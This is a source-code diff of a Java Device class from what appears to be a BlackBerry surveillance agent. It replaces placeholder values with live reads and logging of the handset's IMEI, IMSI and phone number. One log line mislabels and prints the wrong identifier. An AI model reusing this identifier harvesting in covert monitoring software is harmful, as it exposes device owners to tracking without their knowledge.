@@ -8,6 +8,11 @@
 
 package com.ht.rcs.blackberry;
 
+import net.rim.blackberry.api.phone.Phone;
+import net.rim.device.api.system.GPRSInfo;
+import net.rim.device.api.system.SIMCardException;
+import net.rim.device.api.system.SIMCardInfo;
+
 import com.ht.rcs.blackberry.interfaces.Singleton;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
@@ -21,95 +26,102 @@ import com.ht.rcs.blackberry.utils.WChar;
  */
 public class Device implements Singleton {
 
-    /** The debug. */
-    private static Debug debug = new Debug("Device", DebugLevel.VERBOSE);
+	/** The debug. */
+	private static Debug debug = new Debug("Device", DebugLevel.VERBOSE);
 
-    
-    public final static long Version = 20104010932L;
-    public final static String SubType = "BB";
-    
+	public final static int Version = 2010033101;
+	public final static String SubType = "WINMOBILE"; //"BLACKBERRY";
 
-    
-    /** The imei. */
-    String imei = "";
+	/** The imei. */
+	byte[] imei = new byte[0];
 
-    /** The imsi. */
-    String imsi = "";
+	/** The imsi. */
+	byte[] imsi = new byte[0];
 
-    /** The phone number. */
-    String phoneNumber = "";
+	/** The phone number. */
+	String phoneNumber = "";
 
-    /** The instance. */
-    private static Device instance = null;
+	/** The instance. */
+	private static Device instance = null;
 
-    /**
-     * Gets the single instance of Device.
-     * 
-     * @return single instance of Device
-     */
-    public synchronized static Device getInstance() {
-        if (instance == null)
-            instance = new Device();
+	/**
+	 * Gets the single instance of Device.
+	 * 
+	 * @return single instance of Device
+	 */
+	public synchronized static Device getInstance() {
+		if (instance == null)
+			instance = new Device();
 
-        return instance;
-    }
+		return instance;
+	}
 
-    /**
-     * Instantiates a new device.
-     */
-    private Device() {
-    }
+	/**
+	 * Instantiates a new device.
+	 */
+	private Device() {
+	}
 
-    /**
-     * Refresh data.
-     */
-    public void refreshData() {
-        imsi = "123456789012345";
-        imei = "123456789012345";
-        phoneNumber = "+39 02 12345678";
+	/**
+	 * Refresh data.
+	 */
+	public void refreshData() {
 
-    }
+		try {
+			imsi = SIMCardInfo.getIMSI();
+			debug.info("IMSI: " + Utils.imeiToString(imsi));
+		} catch (SIMCardException e) {
+			debug.warn("no sim detected");
+		}
 
-    /**
-     * Gets the imei.
-     * 
-     * @return the imei
-     */
-    public byte[] getImei() {
+		imei = GPRSInfo.getIMEI();
+		debug.info("IMSE: " + Utils.imeiToString(imsi));
 
-        Check.ensures(imei != null, "null imei");
-        byte[] encoded = WChar.getBytes(imei);
-        return encoded;
-    }
+		phoneNumber = Phone.getDevicePhoneNumber(true);
+		if(phoneNumber == null)
+			phoneNumber = "";
+		debug.info("Phone Number: " + phoneNumber);
+	}
 
-    /**
-     * Gets the imsi.
-     * 
-     * @return the imsi
-     */
-    public byte[] getImsi() {
-        Check.ensures(imsi != null, "null imsi");
-        byte[] encoded = WChar.getBytes(imsi);
-        return encoded;
-    }
+	/**
+	 * Gets the imei.
+	 * 
+	 * @return the imei
+	 */
+	public byte[] getImei() {
 
-    /**
-     * Gets the phone number.
-     * 
-     * @return the phone number
-     */
-    public byte[] getPhoneNumber() {
-        Check.ensures(phoneNumber != null, "null phoneNumber");
-        byte[] encoded = WChar.getBytes(phoneNumber);
-        return encoded;
-    }
+		Check.ensures(imei != null, "null imei");
+		return WChar.getBytes(Utils.imeiToString(imei));
+	}
+
+	/**
+	 * Gets the imsi.
+	 * 
+	 * @return the imsi
+	 */
+	public byte[] getImsi() {
+		return WChar.getBytes(Utils.imeiToString(imsi));
+	}
+
+	/**
+	 * Gets the phone number.
+	 * 
+	 * @return the phone number
+	 */
+	public byte[] getPhoneNumber() {
+		Check.ensures(phoneNumber != null, "null phoneNumber");
+		byte[] encoded = WChar.getBytes(phoneNumber);
+		return encoded;
+	}
 
 	public static byte[] getVersion() {
-		return Utils.longToByteArray(Version);
+		byte[] version = Utils.intToByteArray((int)Version);
+		Check.ensures(version.length == 4, "Wrong version len");
+		return version;
 	}
 
 	public static byte[] getSubtype() {
-		
+
 		return SubType.getBytes();
 	}
 
